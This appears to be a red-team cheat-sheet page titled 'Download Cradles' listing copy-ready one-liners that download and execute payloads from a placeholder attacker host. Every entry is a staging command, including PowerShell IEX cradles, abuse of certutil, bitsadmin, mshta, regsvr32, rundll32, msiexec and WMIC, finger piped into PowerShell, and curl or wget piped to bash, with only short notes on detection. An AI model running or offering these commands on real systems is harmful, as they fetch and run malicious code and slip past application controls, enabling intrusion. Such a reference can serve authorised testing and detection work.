---
hide:
  - toc
---

# Download Cradles

Compact payload retrieval and staging one-liners for Windows and Linux.

<div class="ol-section-kicker"><span>RT</span><strong>Transfer</strong></div>

## PowerShell WebClient + IEX

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<HOST>/payload.ps1')
```

**Tool:** PowerShell · **Platform:** Windows · **Tags:** HTTP, Memory, PowerShell

Classic in-memory PowerShell cradle. **Signal:** heavily signatured and commonly monitored.

## PowerShell IWR + IEX

```powershell
IEX (IWR 'http://<HOST>/payload.ps1' -UseBasicParsing).Content
```

**Tool:** PowerShell · **Platform:** Windows · **Tags:** HTTP, Memory, PowerShell

## certutil download

```cmd
certutil.exe -urlcache -split -f http://<HOST>/payload.exe payload.exe
```

**Tool:** certutil · **Platform:** Windows · **Tags:** LOLBin, Download

**Signal:** common LOLBin telemetry target in modern EDR baselines.

## BITSAdmin transfer

```cmd
bitsadmin /transfer job /download /priority high http://<HOST>/payload.exe C:\Windows\Tasks\payload.exe
```

**Tool:** bitsadmin · **Platform:** Windows · **Tags:** BITS, Download, LOLBin

## mshta remote HTA

```cmd
mshta.exe http://<HOST>/payload.hta
```

**Tool:** mshta · **Platform:** Windows · **Tags:** HTA, LOLBin, Execution

## regsvr32 remote scriptlet

```cmd
regsvr32.exe /s /n /u /i:http://<HOST>/payload.sct scrobj.dll
```

**Tool:** regsvr32 · **Platform:** Windows · **Tags:** Scriptlet, LOLBin, Proxy Execution

## curl.exe download

```cmd
curl.exe http://<HOST>/payload.exe -o payload.exe
```

**Tool:** curl · **Platform:** Windows · **Tags:** HTTP, Download

## msiexec remote package

```cmd
msiexec.exe /i http://<HOST>/payload.msi /quiet
```

**Tool:** msiexec · **Platform:** Windows · **Tags:** MSI, Remote Package, Execution

## rundll32 JavaScript execution

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc.exe")
```

**Tool:** rundll32 · **Platform:** Windows · **Tags:** JavaScript, LOLBin, Proxy Execution

## Finger to PowerShell pipeline

```cmd
finger <USER>@<HOST> | powershell.exe -noprofile -
```

**Tool:** finger + PowerShell · **Platform:** Windows · **Tags:** Legacy, Pipeline, Staging

## WMIC remote XSL

```cmd
wmic.exe os get /format:"http://<HOST>/payload.xsl"
```

**Tool:** WMIC · **Platform:** Windows · **Tags:** XSL, Legacy, Proxy Execution

**Note:** WMIC is deprecated and may be absent on newer Windows builds.

## curl to bash

```bash
curl -fsSL http://<HOST>/payload.sh | bash
```

**Tool:** curl + bash · **Platform:** Linux/macOS · **Tags:** HTTP, Pipeline, Shell

## wget to bash

```bash
wget -qO- http://<HOST>/payload.sh | bash
```

**Tool:** wget + bash · **Platform:** Linux · **Tags:** HTTP, Pipeline, Shell

## curl to temporary file and execute

```bash
curl -fsSL http://<HOST>/payload -o /tmp/.p && chmod +x /tmp/.p && /tmp/.p
```

**Tool:** curl · **Platform:** Linux · **Tags:** HTTP, Staging, Execution

## BSD fetch to shell

```bash
fetch -qo - http://<HOST>/payload.sh | sh
```

**Tool:** fetch · **Platform:** BSD · **Tags:** HTTP, Pipeline, Shell

## Python fetch and exec

```bash
python3 -c "import urllib.request;exec(urllib.request.urlopen('http://<HOST>/payload.py').read())"
```

**Tool:** Python · **Platform:** Linux/macOS/Windows · **Tags:** HTTP, Memory, Python

## Perl fetch and eval

```bash
perl -MLWP::Simple -e 'eval get("http://<HOST>/payload.pl")'
```

**Tool:** Perl · **Platform:** Linux/macOS · **Tags:** HTTP, Memory, Perl

## HTTPS curl pipeline

```bash
curl -fkLs https://<HOST>:8443/payload.sh | bash
```

**Tool:** curl + bash · **Platform:** Linux/macOS · **Tags:** HTTPS, Pipeline, Shell

## TFTP retrieve

```bash
tftp <HOST> -c get payload.sh
```

**Tool:** tftp · **Platform:** Linux · **Tags:** TFTP, Legacy, File Transfer
